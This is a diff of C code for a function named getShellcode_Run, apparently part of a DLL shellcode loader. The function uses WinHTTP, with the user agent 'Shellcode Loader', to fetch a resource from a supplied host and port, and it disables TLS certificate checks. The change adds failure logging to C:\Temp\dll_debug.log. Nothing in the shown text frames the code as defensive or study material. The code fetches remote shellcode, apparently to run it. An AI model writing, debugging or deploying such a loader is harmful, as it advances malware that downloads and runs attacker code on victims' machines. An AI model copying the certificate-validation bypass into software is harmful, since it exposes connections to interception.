@@ -328,15 +328,36 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     MultiByteToWideChar(CP_ACP, 0, resource, -1, wResource, 100);
 
     hSession = WinHttpOpen(L"Shellcode Loader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) goto cleanup;
+    if (!hSession) {
+        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
+        if (fp) {
+            fprintf(fp, "WinHttpOpen failed with error: %ld\n", GetLastError());
+            fclose(fp);
+        }
+        goto cleanup;
+    }
 
     hConnect = WinHttpConnect(hSession, wHost, atoi(port), 0);
-    if (!hConnect) goto cleanup;
+    if (!hConnect) {
+        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
+        if (fp) {
+            fprintf(fp, "WinHttpConnect failed with error: %ld\n", GetLastError());
+            fclose(fp);
+        }
+        goto cleanup;
+    }
 
     hRequest = WinHttpOpenRequest(hConnect, L"GET", wResource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hRequest) goto cleanup;
+    if (!hRequest) {
+        FILE* fp = fopen("C:\\Temp\\dll_debug.log", "a");
+        if (fp) {
+            fprintf(fp, "WinHttpOpenRequest failed with error: %ld\n", GetLastError());
+            fclose(fp);
+        }
+        goto cleanup;
+    }
 
-    // Bypass SSL validation for testing
+    // Declare and initialize flags here, after hRequest is valid
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
     WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
